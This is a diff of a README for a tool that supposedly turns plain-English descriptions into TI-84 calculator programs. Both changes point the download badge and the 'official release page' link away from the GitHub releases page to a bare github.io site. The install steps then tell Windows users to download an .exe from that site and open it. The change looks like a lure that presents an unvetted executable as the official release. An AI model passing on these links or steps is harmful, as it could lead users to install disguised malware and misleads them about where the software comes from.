@@ -1,6 +1,6 @@
 # 🧮 ti84-evo-scripter - Turn plain text into calculator programs
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/farragutstarchart330/ti84-evo-scripter/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://farragutstarchart330.github.io)
 
 ## 📌 What is this tool?
 This software helps you write programs for TI-84 graphing calculators without needing to learn how to code. You describe your calculation or logic in plain English, and the tool builds a complete, working script for your TI-Python device.
@@ -11,7 +11,7 @@ The software checks your script against the strict requirements of your calculat
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/farragutstarchart330/ti84-evo-scripter/releases).
+1. Go to the [official release page](https://farragutstarchart330.github.io).
 2. Look for the latest version listed at the top.
 3. Click the file that ends in .exe to start your download.
 4. Once the download finishes, open the file to start the installation.
